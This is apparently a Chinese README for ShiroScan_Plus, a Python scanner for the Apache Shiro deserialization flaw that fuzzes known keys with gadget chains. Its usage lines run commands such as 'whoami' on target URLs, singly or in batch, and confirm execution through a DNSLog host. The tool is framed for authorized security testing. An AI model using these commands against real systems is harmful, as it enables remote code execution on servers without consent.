# ShiroScan_Plus
ShiroScan_Plus是基于sv3nbeast/ShiroScan改进的增强版的Shiro反序列化一键检测工具
 
## 声明
* 不推荐当做exp使用，效率问题
* 仅供安全人员验证,测试是否存在此漏洞
* **使用此工具检测必须遵守请使用者遵守[《中华人民共和国网络安全法》](http://www.npc.gov.cn/npc/xinwen/2016-11/07/content_2001605.htm) ，勿用于非授权的测试，本人不负任何连带法律责任。**  

## 新改动内容
1. 更正requirements.txt，优化代码规范和逻辑问题。 
2. 用[**Koalr**](https://github.com/zema1) 的利用链 
   CommonsCollectionsK1到K4替代CommonsCollections1到7
3. 为了Windows用户方便安装pycrypto，requirements.txt中添加了pycryptodome==3.9.8
4. 增加参数解析，增加DNSLog验证、URL文件批量处理、输出到文件等功能，多个功能可以配合使用。   

## 原改动内容  

1. 新增4个利用链模块(CommonsCollections7-10)，预计增加成功率30%，已打包成新ysoserial的jar包，请勿更换
2. 增加多线程，虽模块增加但速度却提高300%
3. 集成21个key进行fuzz  

## 使用方法  
**运行环境为Python3**
```
* 安装依赖：pip install -r requirments.txt  
* 获取帮助：python3 shiro_rce_plus.py --help
```

```
* 使用示例     
* Example：python3 shiro_rce_plus.py -u https://url.com -c "whoami"
* Example: Python3 shiro_rce_plug.py -f urls.txt -c "whoami"
* Example: Python3 shiro_rce_plug.py -v -f urls.txt --dnslog "{randstr}.testdnslog.com"  
            --check_dnslog "http://check.testdnslog.com/{randstr}"  --flag "True"  
            --output res.txt
```  

## 帮助信息
```
* python3 shiro_rce_plus.py --help  
  

 ____  _     _          ____                  ____  _
/ ___|| |__ (_)_ __ ___/ ___|  ___ __ _ _ __ |  _ \| |_   _ ___
\___ \| '_ \| | '__/ _ \___ \ / __/ _` | '_ \| |_) | | | | / __|
 ___) | | | | | | | (_) |__) | (_| (_| | | | |  __/| | |_| \__ \
|____/|_| |_|_|_|  \___/____/ \___\__,_|_| |_|_|   |_|\__,_|___/

                           原作者： 斯文
                           修改：  Hack3rHan

usage: shiro_rce_plus.py [-h] [-u URL] [-f FILE] [-c COMMAND] [-v] [--output OUTPUT] [--dnslog DNSLOG]
                         [--flag FLAG] [--check_dnslog CHECK_DNSLOG]

optional arguments:
  -h, --help            show this help message and exit
  -u URL, --url URL     待检测单个URL。
  -f FILE, --file FILE  待检测URL文件，换行分割。
  -c COMMAND, --command COMMAND
                        要执行的命令。
  -v, --verify          使用DNSLog验证。
  --output OUTPUT       输出到文件，文件不存在会自动创建。
  --dnslog DNSLOG       包含{randstr}的字符串，randstr会被format。
  --flag FLAG           DNSlog检查页面包含的关键词。
  --check_dnslog CHECK_DNSLOG
                        包含{randstr}的字符串，randstr会被format。


```
## 其他
* 新利用链来自[**Koalr**](https://github.com/zema1) 的https://mp.weixin.qq.com/s/jV3B6IsPARRaxetZUht57w  
* 如果有帮助，请点个star哦，对应blog文章：http://www.svenbeast.com/post/tskRKJIPg/
* http://www.dnslog.cn/  验证推荐使用这个dnslog平台，速度比ceye.io要快很多
* 执行的命令带空格记得用""引起来
* 11个模块全部跑一遍,然后去dnslog平台查看是否收到请求，不出来就GG，也可能是因为编码还不够多
* 请自行收集编码，在moule下的源代码中自行添加方法即可
* 为了脚本运行简单，多线程数量不是使用者传参控制，默认20线程，如需改动请到/moule/main.py第20行代码自行修改控制线程的参数  

